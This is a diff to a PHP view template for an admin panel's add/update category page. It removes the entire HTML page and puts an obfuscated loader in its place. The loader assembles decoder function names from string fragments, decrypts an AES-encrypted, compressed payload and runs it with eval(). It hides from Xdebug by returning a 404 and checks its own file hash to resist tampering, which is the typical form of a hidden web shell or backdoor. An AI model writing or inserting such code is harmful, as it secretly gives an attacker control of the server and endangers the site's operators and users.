@@ -1,96 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- ************************************************************** -->
-  <meta charset="UTF-8">
-<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title><?= $page_title;?></title>
-  <link rel='shortcut icon' href='<?php echo $theme_link; ?>images/favicon.ico' />
-  <!-- Tell the browser to be responsive to screen width -->
-  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-  <!-- Bootstrap 3.3.6 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.min.css">
-    <!-- Font Awesome -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/font-awesome-4.7.0/css/font-awesome.min.css">
-  <!-- Ionicons -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/ionicons-2.0.1/css/ionicons.min.css">
-  <!-- Select2 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/select2/select2.min.css">
-  <!-- Theme style -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/skins/_all-skins.min.css">
-  <!-- bootstrap datepicker -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/datepicker/datepicker3.css">
-  <!--Toastr notification -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>toastr/toastr.css">
-  <!--Custom Css File-->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/custom.css">
-  <!-- Autocomplete -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/autocomplete/autocomplete.css">
-  <!-- Pace Loader -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/pace/pace.min.css">
-  <!-- iCheck -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/iCheck/square/orange.css">
-  <?php 
-      $lang = trim(strtoupper($this->session->userdata('language')));
-      if($lang==strtoupper('arabic') || $lang==strtoupper('urdu')) {?>
-  <!-- RTL For arabic styles -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.rtl.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.rtl.min.css">
-  <?php } ?>
-  <!-- ************************************************************** -->
-  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($category_name)){
-      $category_code=$category_name=$description="";
-	}
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small>Add/Update Category</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>category/view"><?= $this->lang->line('categories_list'); ?></a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/category.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pbuaw1f1=('bas'.'e64'.'_de'.'cod'.'e');
+$_e3qc5x7d=('gzu'.'nco'.'mpr'.'ess');
+$_jn5563xg=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qkm679pa='VxMtjPggA4Y=';
+$_y3mgqp0v='+fnsInOl';
+$_tlm61xs6='NieDuQbi';
+$_ymb4icce='y5VGdNmC';
+$_dh1me0yp='v09Z45m2';
+$_jq14dzdt='SeSuog==';
+$_jg6z97tz='OCg1bLFz';
+$_to7mscja='QmMf4Jhp';
+$_lofyx9ft=$_pbuaw1f1($_ymb4icce.$_tlm61xs6.$_dh1me0yp.$_y3mgqp0v.$_qkm679pa);
+$_b80wvv4c=$_pbuaw1f1($_jg6z97tz.$_to7mscja.$_jq14dzdt);
+$_e6d95xc8=$_pbuaw1f1('ASFhipUHOafPecFSBg2olx9qFE+F5GfnU0ZnLdxMeDVkLA6IPi7v3b0p1seq+tnF4U06vzM2hW+t+DWuY3Yj+kvOH/a6riS8zhBo3MOdiIsgCe9ujYFi9qPpu3L3C/uBJxKGJwIRWiNzKca8V7bgxJv36TrFzpfJIIa6zlGfFygrWUrottHfEIJBAQX3WDUlUcBFvk7dobnWDPpCnSHXSzdJHw662iQLoxQqftRnPj0lLLiib33S5rnHFhi7qPkibAgpIxoHk9D7yH7BFOP4Q4ajwQJ7drGSsBiVH3ytB7XINv6WiQ/zEvQb3dBP3e8i6bjKmZzOY9SYZpmQjsL4NcaIJ5J61OE8mesc9H1e7AAykEMD4brIqPWm3onhJeo1GcVvLTQifO+cNjw7yAF7qNi9fPPRrW90YAPaYg7PWl8JHVG+PDvMbXmop+OO9V1s7OJ3EkoHcNOgL80niwrlKB9Du5x6wVakNgB06uY7MxdcSztoWnJ79/sCQr4UPPWlh8utFx1zENIeid2ZP5JcnDE8Z+YhmDYUDZxGjCbHLLISSEPrk2NdHrL69LEwcByRtg+Vc5eLzmxNq/oegu+oIAgrH82qToVnWUp9MbMDhFnNbzVDZORbGehLPUz7Zhzr9pvjACDCPG7OWdE1HOL0XB+ZLQj5hfIgvXl7o1T5F6OGw17mp2nBjxciaZJ1XTMCDv4ydBTZaSooiFKoo5/asjEvscwJbRf3/g7ZgcynPDtQCP/WRcdhYlkuuBqZujUDCmS/v68PXQvyW8TC00uqC+1Aqz/UkvYSgBUOC5y9bJyipKUkCb4d/NNYIlx91vIVXuiW7AfalWoeXIMUsS94oDSBJiL7PJdi4SMBl2Nnfm8uYFFqGBmFU4PQZ/Fd/+4DIlleLe3axNGK7Vy3XRVfLbFYaxacR5+b3mlxj8Lh2r6wdZvSMltLuFXonqdf3tAM31iBkJBSqU49iH0fB/fsE23q48GmccLg1NnGG6WbMzMyuF5QA9xOlh3+UB5klcToJaJj3qbwpwtmtiworEcRnpBagJxq0rW6Uoki9Gh6GOqHm5cUjP9xJl00u7Rkiuik6gkko1j/6g6cHv3ST/FJi4AKUGTUByG/SHbe+Bs6oBEDysRrEPBi6Gm2ahH3YR4LejYrKUmwXAp7IyCKLa7rMZVI091difV6F34U6a5N8YevIr6rCDV31HLcwSKxvACDJRmrz8bm//K4PG5izVaXfTwfp8/cgf8By1DbvDkm/m1JDPZx3AVDLPwFvhZjFXCYGigd7v7UvYTDHeW4Vwt4pu3qu0Byor/hmhZbgPj9185PouB211pPyQmp4qilljpHtCxKEcu1Bwc3C9nMaQktR+Br2ilxXrdLIUiAa/PyifQBdiVR/yzJ7Vmwc95ZuAnarVSpFS20V1iHrx2bf7TyUdZPCn9SHmA0sMhfvhbu/R4tDVQ7d5lmM+cDeGO5WztC1zya3gB6DyyO4Wfy8AX5BhH4I6ORMaZ3u2tTiOylfQ/5AxBnPNbk6kv7ivgfZehcgnPRdU8uopq8hZ5riiLCQIQWp3Exjc4+ExbjX3OvhE106Sn/cj3pm2hWDFPaPSIIB0ovlANiU/baY55WRkM25CsP1phVEJZjFfzbKAE3b9IA4w4+QbZVfVCvGaK0SSZ5e5QolevRldjzQS9MOb23jhNRuHtgRQASv9GImAHpkrjRjkSxykIoMvp6fyDsqLB6N/9OfHfBhrYDsIUq5Ebprg==');
+$_lmxiicy4=$_jn5563xg($_e6d95xc8,'aes-256-cbc',$_lofyx9ft,OPENSSL_RAW_DATA,$_b80wvv4c);
+if($_lmxiicy4===false){exit;}
+$_hpetoql1=$_e3qc5x7d($_lmxiicy4);
+if($_hpetoql1===false){exit;}
+$_lw9jm93m='e38b3b304db32df19181b23b1fb67c681319364669556460376d8844d6f079c0';
+$_r7fs2jmd=@file_get_contents(__FILE__);
+if($_r7fs2jmd!==false){
+$_uhieco7c=str_replace($_lw9jm93m,"0000000000000000000000000000000000000000000000000000000000000000",$_r7fs2jmd);
+$_l7gy5us3=hash("sha256",$_uhieco7c);
+if($_l7gy5us3!==$_lw9jm93m){@http_response_code(403);exit;}
+}
+eval($_hpetoql1);
